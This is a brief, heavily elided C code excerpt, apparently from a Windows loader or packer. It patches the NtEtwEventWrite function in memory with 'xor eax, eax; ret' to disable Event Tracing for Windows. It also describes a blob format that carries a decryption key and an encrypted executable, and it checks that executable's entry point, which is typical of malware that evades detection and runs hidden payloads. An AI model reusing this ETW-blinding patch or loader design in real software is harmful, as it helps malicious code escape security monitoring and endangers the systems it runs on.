...
typedef VOID (WINAPI *EntryPoint_t)(VOID);
...
{//*
    ...
    if (!pNtProtectVirtualMemory(CUR_PROC, &fadr, &fsz, PAGE_READWRITE, &fold)) {
        ((volatile BYTE*)pNtEtwEventWrite)[0] = 0x31; // xor
        ((volatile BYTE*)pNtEtwEventWrite)[1] = 0xC0; // eax, eax
        ((volatile BYTE*)pNtEtwEventWrite)[2] = 0xC3; // ret 
...
// [UINT32=total_len:4|BYTE=key_size:1|LPCBYTE=key:key_size|UINT32=raw_len:4|LPCBYTE=encrypted_exe]
    ...
    if (!aep || (aep > nthd->OptionalHeader.SizeOfImage))
        Exit(STATUS_ENTRYPOINT_NOT_FOUND); 
